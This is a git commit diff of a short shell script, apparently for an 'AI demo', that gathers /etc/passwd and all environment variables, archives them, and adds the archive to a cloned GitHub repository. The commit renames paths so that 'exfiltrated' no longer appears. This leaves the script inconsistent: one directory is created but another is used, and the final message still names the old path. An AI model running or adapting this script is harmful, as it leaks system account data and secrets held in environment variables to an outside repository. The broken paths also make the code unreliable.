4987d938145f612d27bdf68343a8430a90e01a62
Fekr09a <107809253+Fekr09a@users.noreply.github.com>
2025-10-16 10:56:52 +0200

    Update demo_script.sh

--- demo_script.sh
+++ demo_script.sh
@@ -18,22 +18,22 @@ apt-get update && apt-get install -y git
 
 echo "Collecte des données sensibles..."
 
-mkdir -p /tmp/data_exfiltrated
-cp /etc/passwd /tmp/exfiltration/users.txt
-printenv > /tmp/exfiltration/env_vars.txt
+mkdir -p /tmp/data_e
+cp /etc/passwd /tmp/e/users.txt
+printenv > /tmp/e/env_vars.txt
 
 
 echo "Création de l'archive..."
-tar czf /tmp/data_exfiltrated.tar.gz -C /tmp/exfiltration .
+tar czf /tmp/data_e.tar.gz -C /tmp/e .
 
 
 # Clone le repo 
 git clone https://github.com/Fekr09a/ai-demo.git
 cd ai-demo
 git config user.email "Paris@PlatformCon.com"
-cp /tmp/data_exfiltrated.tar.gz .
+cp /tmp/data_e.tar.gz .
 ls
-git add data_exfiltrated.tar.gz
+git add data_e.tar.gz
 
 echo "Les données ont été collectées et archivées dans /tmp/data_exfiltrated.tar.gz"
 echo "Script terminé."
